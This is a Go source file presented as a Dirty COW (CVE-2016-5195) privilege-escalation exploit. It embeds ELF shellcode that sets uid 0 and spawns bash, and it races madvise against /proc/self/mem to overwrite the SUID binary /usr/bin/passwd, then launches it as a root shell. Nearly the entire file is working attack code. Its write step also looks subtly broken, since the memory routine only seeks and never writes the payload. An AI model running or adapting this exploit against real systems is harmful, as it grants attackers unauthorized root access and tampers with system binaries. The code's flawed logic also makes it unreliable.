// dirty cow exploit

package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"syscall"
)

var MSFV_payload = []byte{
	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00,
	0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x78, 0x00, 0x40, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
	0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
	0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xb1, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x31, 0xff, 0x6a, 0x69, 0x58,
	0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
	0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e,
	0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
	0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00,
	0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
	0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62,
	0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
	0x68, 0x00, 0x56, 0x57, 0x48, 0x89,
	0xe6, 0x0f, 0x05,
}

var proc = "/proc/self/mem"
var map_main uintptr
var sig = make(chan bool, 2)

const SUID = "/usr/bin/passwd"

func ce(err error, exit_code int) {
	if err != nil {
		fmt.Println("[ CVE-2016-5195 pwn ] Error: -> ", err)
		os.Exit(exit_code)
	}
}

func mad_vise() {
	for i := 0; i < 1000000; i++ {
		select {
		case <-sig:
			fmt.Println("[+] Sig: -> ", sig)
			fmt.Println("[+] MadVise Function complete (100%)")
			return
		default:
			syscall.Syscall(syscall.SYS_MADVISE, map_main, uintptr(100), syscall.MADV_DONTNEED)
		}

	}
}

func mem(payload []byte) {
	open_proc, e := os.OpenFile(proc, syscall.O_RDWR, 0)
	ce(e, 1)
	for i := 0; i < 1000000; i++ {
		select {
		case <-sig:
			fmt.Println("[+] Sig: -> ", sig)
			fmt.Println("[+] Proc function complete (100%)")
		default:
			syscall.Syscall(syscall.SYS_LSEEK, open_proc.Fd(), map_main, uintptr(io.SeekStart))
		}
	}
}

func write_wait() {
	buffer := make([]byte, len(MSFV_payload))
	for {
		file, err := os.Open(SUID)
		ce(err, 1)
		if _, err := file.Read(buffer); err != nil {
			panic(err)
		}
		file.Close()
		if !bytes.Equal(buffer, MSFV_payload) {
			fmt.Printf("[!] %s has been over written\n", SUID)
			break
		}
	}
	sig <- true
	sig <- true
	fmt.Println("\033[32m[+] Popping R00T shell")
	fmt.Print("\033[31m[!] Do NOT forget to restore /tmp/bak\n")
	attr := os.ProcAttr{Files: []*os.File{os.Stdin, os.Stdout, os.Stderr}}
	proc, err := os.StartProcess(SUID, nil, &attr)
	ce(err, 1)
	proc.Wait()
	os.Exit(0)
}

func attack_main() {
	fmt.Printf("[ WARN ] Backing up %s to new directory => /tmp/bak", SUID)
	backup_SUID := exec.Command("cp", SUID, "/tmp/bak")
	if err := backup_SUID.Run(); err != nil {
		log.Fatal(err)
	}
	file, err := os.OpenFile(SUID, os.O_RDONLY, 0600)
	ce(err, 1)
	state, err_stat := file.Stat()
	ce(err_stat, 1)
	fmt.Printf("[+] Current size of binary -> %d\n", state.Size())
	payload_main := make([]byte, state.Size())
	for i := range payload_main {
		payload_main[i] = 0x90
	}
	for i, v := range MSFV_payload {
		payload_main[i] = v
	}
	map_main, _, _ = syscall.Syscall6(syscall.SYS_MMAP, uintptr(0), uintptr(state.Size()), uintptr(syscall.PROT_READ), uintptr(syscall.MAP_PRIVATE), file.Fd(), 0)
	fmt.Println("Racing, this may take a while..")
	go mad_vise()
	go mem(payload_main)
	write_wait()
}

func main() {
	fmt.Printf("[+} Using payload - %q\n\n", MSFV_payload)
	attack_main()
}
